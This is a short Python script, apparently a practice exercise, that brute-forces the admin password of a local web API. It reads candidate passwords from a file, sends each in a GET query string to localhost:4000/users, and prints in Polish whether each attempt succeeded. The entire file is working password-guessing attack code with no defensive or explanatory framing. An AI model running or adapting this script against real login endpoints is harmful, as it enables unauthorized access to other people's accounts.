import requests

api_url = 'http://localhost:4000/users?login=admin&pass='
def brute_force(file_path):
    with open(file_path, 'r') as file:
        for line in file:
            password = line.strip()
            response = requests.get(api_url + password)
            if response.status_code == 200:
                print(f"Znaleziono poprawne hasło: {password}")
                return
            else:
                print(f"Próba hasła {password} nie powiodła się.")

brute_force('pass.txt')


# http://localhost:4000/users?login=admin&pass=123456